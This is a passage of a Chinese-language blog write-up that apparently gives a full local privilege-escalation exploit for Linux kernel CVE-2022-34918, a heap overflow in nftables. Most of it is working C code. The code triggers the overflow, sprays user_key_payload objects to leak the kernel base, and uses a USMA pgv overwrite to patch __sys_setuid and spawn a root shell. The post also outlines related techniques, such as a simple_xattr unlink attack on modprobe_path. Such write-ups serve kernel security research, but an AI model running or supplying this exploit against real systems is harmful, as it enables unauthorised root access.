nla[NFTA_SET_ELEM_LIST_TABLE], family,</span><br><span class="line">				 genmask, NETLINK_CB(skb).portid);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(table)) {</span><br><span class="line">		NL_SET_BAD_ATTR(extack, nla[NFTA_SET_ELEM_LIST_TABLE]);</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(table);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="built_in">set</span> = nft_set_lookup_global(net, table, nla[NFTA_SET_ELEM_LIST_SET],</span><br><span class="line">				    nla[NFTA_SET_ELEM_LIST_SET_ID], genmask);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(<span class="built_in">set</span>))</span><br><span class="line">		<span class="keyword">return</span> PTR_ERR(<span class="built_in">set</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!list_empty(&amp;<span class="built_in">set</span>-&gt;bindings) &amp;&amp; <span class="built_in">set</span>-&gt;flags &amp; NFT_SET_CONSTANT)</span><br><span class="line">		<span class="keyword">return</span> -EBUSY;</span><br><span class="line"></span><br><span class="line">	nft_ctx_init(&amp;ctx, net, skb, info-&gt;nlh, family, table, <span class="literal">NULL</span>, nla);</span><br><span class="line"></span><br><span class="line">	nla_for_each_nested(attr, nla[NFTA_SET_ELEM_LIST_ELEMENTS], rem) {</span><br><span class="line">		err = nft_add_set_elem(&amp;ctx, <span class="built_in">set</span>, attr, info-&gt;nlh-&gt;nlmsg_flags);</span><br><span class="line">		<span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> err;</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nft_net-&gt;validate_state == NFT_VALIDATE_DO)</span><br><span class="line">		<span class="keyword">return</span> nft_table_validate(net, table);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/2-uninit-path.png"></p>
+<p>GFP_KERNEL完全可控堆溢出咋利用? 只能说对于USMA之后时代的研究者, 答案已经不言而喻了.</p>
+<p>先堆溢出覆盖user_key_payload的datalen字段造越界读, 读的对象也就是user_key_payload对象本身RCU释放时的user_free_payload_rcu函数指针, 得到内核基址.</p>
+<p>再堆溢出覆盖pgv数组, USMA修改__sys_setuid即可.</p>
+<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><p>完整EXP及测试环境可在此获取: <a target="_blank" rel="noopener" href="https://github.com/Polaris-Snowfall/kernel_exploit/blob/main/CVE-2022-34918/">CVE-2022-34918</a> .<br>首先把触发堆溢出的板子写出来, 还是使用libnftnl的导出函数.<br>先添加一个NFTNL_SET_ELEM_DATA类型的elem布置payload, 再添加NFTNL_SET_ELEM_VERDICT类型的elem触发溢出, 然后一起通过send_batch_request发送.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">trigger_overflow</span><span class="params">(<span class="keyword">struct</span> mnl_socket* nl, <span class="type">char</span>* table_name, <span class="type">char</span>* set_name, <span class="type">uint16_t</span> family,<span class="type">int</span>* seq,<span class="type">char</span>* payload,<span class="type">int</span> id)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nftnl_set</span> *<span class="title">s</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    s = nftnl_set_alloc();</span><br><span class="line">	<span class="keyword">if</span> (s == <span class="literal">NULL</span>)</span><br><span class="line">		err_exit(<span class="string">"nftnl_set_alloc"</span>);</span><br><span class="line">	nftnl_set_set_str(s, NFTNL_SET_TABLE, table_name);</span><br><span class="line">	nftnl_set_set_str(s, NFTNL_SET_NAME, set_name);</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">nftnl_set_elem</span> *<span class="title">e</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    e = nftnl_set_elem_alloc();</span><br><span class="line">	<span class="keyword">if</span> (e == <span class="literal">NULL</span>)</span><br><span class="line">		err_exit(<span class="string">"nftnl_set_alloc"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> data[<span class="number">0x100</span>] = {<span class="number">0</span>};</span><br><span class="line">    <span class="built_in">memset</span>(data,<span class="string">'a'</span>,<span class="keyword">sizeof</span>(data));</span><br><span class="line">    <span class="built_in">snprintf</span>(data,<span class="number">0x100</span>,<span class="string">"key1_%d"</span>);</span><br><span class="line">    nftnl_set_elem_set(e ,NFTNL_SET_ELEM_KEY,data,<span class="number">0x1C</span>);</span><br><span class="line">    nftnl_set_elem_set(e ,NFTNL_SET_ELEM_DATA,payload,<span class="number">0x28</span>);</span><br><span class="line">    nftnl_set_elem_add(s,e);</span><br><span class="line"></span><br><span class="line">	e = <span class="literal">NULL</span>;</span><br><span class="line">    e = nftnl_set_elem_alloc();</span><br><span class="line">	<span class="keyword">if</span> (e == <span class="literal">NULL</span>)</span><br><span class="line">		err_exit(<span class="string">"nftnl_set_alloc"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(data,<span class="string">'A'</span>,<span class="keyword">sizeof</span>(data));</span><br><span class="line">    <span class="built_in">snprintf</span>(data,<span class="number">0x100</span>,<span class="string">"key2_%d"</span>);</span><br><span class="line">    nftnl_set_elem_set(e ,NFTNL_SET_ELEM_KEY,data,<span class="number">0x1C</span>);</span><br><span class="line">    nftnl_set_elem_set_u32(e,NFTNL_SET_ELEM_VERDICT,NF_DROP);</span><br><span class="line">    nftnl_set_elem_add(s,e);</span><br><span class="line"></span><br><span class="line">    ret =  send_batch_request(</span><br><span class="line">        nl,</span><br><span class="line">        NFT_MSG_NEWSETELEM | (NFT_TYPE_SET_ELEMS &lt;&lt; <span class="number">8</span>),</span><br><span class="line">        NLM_F_CREATE, family, (<span class="type">void</span>**)&amp;s, seq,</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(ret &lt; <span class="number">0</span> &amp;&amp; ret != -EEXIST)</span><br><span class="line">        err_exit(<span class="string">"send_batch_request"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后是leak, 步骤是:</p>
+<ul>
+<li>堆喷user_key_payload, 并释放其中的一部分</li>
+<li>触发elem对象的分配和堆溢出, 尝试覆写user_key_payload-&gt;datalen.</li>
+<li>遍历读取每一个key, 如果读出的长度为0xfff, 则找到了被我们修改的key, 从中泄露出内核基址</li>
+<li>如果没找到, 释放掉整个key再次尝试(注意unlink和revoke的区别).<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> NKEYS_SPRAY 128*1 + 22</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_HOLES_BEGIN 100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_HOLES_STEP 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> KEY_PAYLOAD_LEN 32</span></span><br><span class="line"><span class="type">int</span> key_ids[NKEYS_SPRAY];</span><br><span class="line"><span class="type">int</span> corrupted_key = <span class="number">-1</span>;</span><br><span class="line"><span class="type">int</span> id = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">leak</span><span class="params">(<span class="keyword">struct</span> mnl_socket* nl, <span class="type">char</span>* table_name, <span class="type">char</span>* set_name, <span class="type">uint16_t</span> family,<span class="type">int</span>* seq)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">char</span> desc[<span class="number">0x100</span>] = {<span class="number">0</span>};</span><br><span class="line">    <span class="type">char</span> key_payload[<span class="number">0x100</span>] = {<span class="number">0</span>};</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">retry:</span><br><span class="line">    <span class="built_in">memset</span>(key_payload,<span class="string">'C'</span>,<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; NKEYS_SPRAY;++i)</span><br><span class="line">    {</span><br><span class="line">        <span class="built_in">snprintf</span>(desc,<span class="number">0x100</span>,<span class="string">"desc%d"</span>,i);</span><br><span class="line">        key_ids[i] = key_alloc(desc,key_payload,KEY_PAYLOAD_LEN);</span><br><span class="line">        <span class="keyword">if</span>(key_ids[i] == <span class="number">-1</span>)</span><br><span class="line">            err_exit(<span class="string">"key_alloc"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = KEY_HOLES_BEGIN; i &lt; NKEYS_SPRAY; i+= KEY_HOLES_STEP)</span><br><span class="line">    {</span><br><span class="line">        ret = key_revoke(key_ids[i]);</span><br><span class="line">        <span class="keyword">if</span>(ret &lt; <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">"key_revoke"</span>);</span><br><span class="line">    }</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> leak_payload[<span class="number">0x100</span>] = {<span class="number">0</span>};</span><br><span class="line">    <span class="built_in">memset</span>(leak_payload,<span class="string">'B'</span>,<span class="number">0x100</span>);</span><br><span class="line">    *(<span class="type">uint16_t</span>*)(leak_payload+<span class="number">0x20</span>) = <span class="number">0xfff</span>;</span><br><span class="line"></span><br><span class="line">    trigger_overflow(nl,table_name,set_name,family,seq,leak_payload,id);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; NKEYS_SPRAY;++i)</span><br><span class="line">    {</span><br><span class="line">        ret = key_read(key_ids[i],buff,<span class="number">0xfff</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret == <span class="number">0xfff</span>)</span><br><span class="line">        {</span><br><span class="line">            corrupted_key = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">    }    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(corrupted_key == <span class="number">-1</span>)</span><br><span class="line">    {</span><br><span class="line">        loge(<span class="string">"Not Found corrupted user_key_payload, try again..."</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; NKEYS_SPRAY;++i)</span><br><span class="line">            ret = key_unlink(key_ids[i]);</span><br><span class="line">        id++;</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">goto</span> retry;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    logi(<span class="string">"Found corrupted user_key_payload, id: %d"</span>,corrupted_key);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; NKEYS_SPRAY;++i)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(i == corrupted_key)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        ret = key_revoke(key_ids[i]);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    ret = key_read(key_ids[corrupted_key],buff,<span class="number">0xfff</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xfff</span>/<span class="number">0x40</span>; ++i)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(buff[<span class="number">6</span>+i*<span class="number">8</span>] &gt; <span class="number">0xffff000000000000</span>)</span><br><span class="line">        {</span><br><span class="line">            kernel_base = buff[<span class="number">6</span>+i*<span class="number">8</span>]<span class="number">-0x34f8a0</span>;</span><br><span class="line">            HEX(<span class="string">"kernel_base"</span>,kernel_base);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    key_revoke(key_ids[corrupted_key]);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li>
+</ul>
+<p>基本同样的方式, 只不过堆喷的对象从user_key_payload变成了pgv. 最后改写__sys_setuid之后, 要使用一个提前准备好的根命名空间中的进程来弹root shell.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">USMA</span><span class="params">(<span class="keyword">struct</span> mnl_socket* nl, <span class="type">char</span>* table_name, <span class="type">char</span>* set_name, <span class="type">uint16_t</span> family,<span class="type">int</span>* seq)</span></span><br><span class="line">{</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="type">char</span>* corrupted_ptr = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">char</span>* ptr;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NPGV_SPRAY 50</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_HOLES_BEGIN 30</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PGV_HOLES_STEP 5</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> sockfds[NPGV_SPRAY];</span><br><span class="line">retry:</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; NPGV_SPRAY; ++i)</span><br><span class="line">    {</span><br><span class="line">        sockfds[i] = create_socket_and_alloc_pages(<span class="number">0x1000</span>,<span class="number">5</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = PGV_HOLES_BEGIN; i &lt; NPGV_SPRAY; i+= PGV_HOLES_STEP)</span><br><span class="line">    {</span><br><span class="line">        ret = close(sockfds[i]);</span><br><span class="line">        <span class="keyword">if</span>(ret &lt; <span class="number">0</span>)</span><br><span class="line">            err_exit(<span class="string">"free pages"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SETUID_OFFSET 0x621c0</span></span><br><span class="line">    <span class="type">char</span> USMA_payload[<span class="number">0x100</span>] = {<span class="number">0</span>};</span><br><span class="line">    <span class="built_in">memset</span>(USMA_payload,<span class="string">'B'</span>,<span class="number">0x100</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)(USMA_payload+<span class="number">0x10</span>) = (kernel_base+SETUID_OFFSET) &amp; (~<span class="number">0xfff</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)(USMA_payload+<span class="number">0x18</span>) = (kernel_base+SETUID_OFFSET+<span class="number">0x1000</span>) &amp; (~<span class="number">0xfff</span>);</span><br><span class="line">    *(<span class="type">size_t</span>*)(USMA_payload+<span class="number">0x20</span>) = (kernel_base+SETUID_OFFSET+<span class="number">0x2000</span>) &amp; (~<span class="number">0xfff</span>);</span><br><span class="line"></span><br><span class="line">    trigger_overflow(nl,table_name,set_name,family,seq,USMA_payload,id);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; NPGV_SPRAY; ++i)</span><br><span class="line">    {</span><br><span class="line">        ptr = mmap(<span class="literal">NULL</span>,<span class="number">5</span>*<span class="number">0x1000</span>,PROT_READ|PROT_WRITE,MAP_SHARED,sockfds[i],<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span>(ptr == <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">// HEX("asd",*(size_t*)ptr);</span></span><br><span class="line">        <span class="keyword">if</span>(*(<span class="type">size_t</span>*)ptr == <span class="number">0x00000080a88b48fe</span>)</span><br><span class="line">        {</span><br><span class="line">            corrupted_ptr = ptr;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">        munmap(ptr,<span class="number">0x5000</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(corrupted_ptr == <span class="literal">NULL</span>)</span><br><span class="line">    {</span><br><span class="line">        loge(<span class="string">"Not found corrupted pgv, try again..."</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; NPGV_SPRAY; i++)</span><br><span class="line">        {</span><br><span class="line">            ret = close(sockfds[i]);</span><br><span class="line">        }</span><br><span class="line">        id++;</span><br><span class="line">        <span class="keyword">goto</span> retry;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    logi(<span class="string">"Found corrupted pgv, now overwrite __sys_setuid"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(*((<span class="type">char</span>*)ptr+<span class="number">0x21d</span>) == <span class="number">0x74</span>)</span><br><span class="line">        *((<span class="type">char</span>*)ptr+<span class="number">0x21d</span>) = <span class="number">0x75</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        fail_exit(<span class="string">"something wrong when overwrite __sys_setuid"</span>);</span><br><span class="line"></span><br><span class="line">    sync_s-&gt;x1 = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">        ;</span><br><span class="line">    </span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">prepare_root_process</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    <span class="keyword">if</span>(fork() == <span class="number">0</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">while</span> (!sync_s-&gt;x1)</span><br><span class="line">            ;</span><br><span class="line">        </span><br><span class="line">        setuid(<span class="number">0</span>);</span><br><span class="line">        get_root_shell();</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        </span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/20241210165729.png"></p>
+<h4 id="Something"><a href="#Something" class="headerlink" title="Something"></a>Something</h4><p>一些与该漏洞相关的技术:</p>
+<ol>
+<li><p>原作者使用percpu_ref_data对象来泄露地址信息, 该对象可通过io_uring_setup分配.</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">percpu_ref_data</span> {</span></span><br><span class="line">    <span class="type">atomic_long_t</span>       count;</span><br><span class="line">    <span class="type">percpu_ref_func_t</span>   *release;</span><br><span class="line">    <span class="type">percpu_ref_func_t</span>   *confirm_switch;</span><br><span class="line">    <span class="type">bool</span>            force_atomic:<span class="number">1</span>;</span><br><span class="line">    <span class="type">bool</span>            allow_reinit:<span class="number">1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>     <span class="title">rcu</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">percpu_ref</span>   *<span class="title">ref</span>;</span></span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li><p>原作者借鉴 <a target="_blank" rel="noopener" href="https://starlabs.sg/blog/2022/06-io_uring-new-code-new-bugs-and-a-new-exploit-technique/">https://starlabs.sg/blog/2022/06-io_uring-new-code-new-bugs-and-a-new-exploit-technique/</a> 中的unlink attack, 堆溢出修改simple_xattr的链表头, 使得在unlink时能触发next-&gt;prev = prev的写入. 但这同时要求prev是可写地址, 所以能写入的内容并不是完全可控. 如果能泄露线性映射区的地址, 就可以构造一个前四字节为任意值的合法地址, 从而将modprobe_path修改为 /tmp/xxxxprobe.</p>
+</li>
+</ol>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">simple_xattr</span> {</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">    <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">    <span class="type">char</span> value[];</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> __list_del(<span class="keyword">struct</span> list_head * prev, <span class="keyword">struct</span> list_head * next)</span><br><span class="line">{</span><br><span class="line">	next-&gt;prev = prev;</span><br><span class="line">	WRITE_ONCE(prev-&gt;next, next);</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<ol start="3">
+<li>veritas501在<a target="_blank" rel="noopener" href="https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/">基于USMA的内核通用EXP编写思路在 CVE-2022-34918 上的实践 </a> 中提出了一些编写内核偏移无关利用的思路:<br>通过从fs_context中泄露地址, 由于其中有内核函数地址和cred地址, 可以轻松的编写内核无关EXP并进行提权.</li>
+</ol>
+<p>(其实能写不限长度的内核shellcode了, 感觉做啥都是信手拈来…).</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fs_context</span> {</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">fs_context_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		<span class="title">uapi_mutex</span>;</span>	<span class="comment">/* Userspace access mutex */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_system_type</span>	*<span class="title">fs_type</span>;</span></span><br><span class="line">	<span class="type">void</span>			*fs_private;	<span class="comment">/* The filesystem's context */</span></span><br><span class="line">	<span class="type">void</span>			*sget_key;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">dentry</span>		*<span class="title">root</span>;</span>		<span class="comment">/* The root and superblock */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span>	*<span class="title">user_ns</span>;</span>	<span class="comment">/* The user namespace for this mount */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">net</span>		*<span class="title">net_ns</span>;</span>	<span class="comment">/* The network namespace for this mount */</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>	*<span class="title">cred</span>;</span>		<span class="comment">/* The mounter's credentials */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fc_log</span>		*<span class="title">log</span>;</span>		<span class="comment">/* Logging buffer */</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span>		*source;	<span class="comment">/* The source name (eg. dev path) */</span></span><br><span class="line">	<span class="type">void</span>			*security;	<span class="comment">/* Linux S&amp;M options */</span></span><br><span class="line">	<span class="type">void</span>			*s_fs_info;	<span class="comment">/* Proposed s_fs_info */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		sb_flags;	<span class="comment">/* Proposed superblock flags (SB_*) */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		sb_flags_mask;	<span class="comment">/* Superblock flags that were changed */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		s_iflags;	<span class="comment">/* OR'd with sb-&gt;s_iflags */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span>		lsm_flags;	<span class="comment">/* Information flags from the fs to the LSM */</span></span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">fs_context_purpose</span>	<span class="title">purpose</span>:</span><span class="number">8</span>;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">fs_context_phase</span>	<span 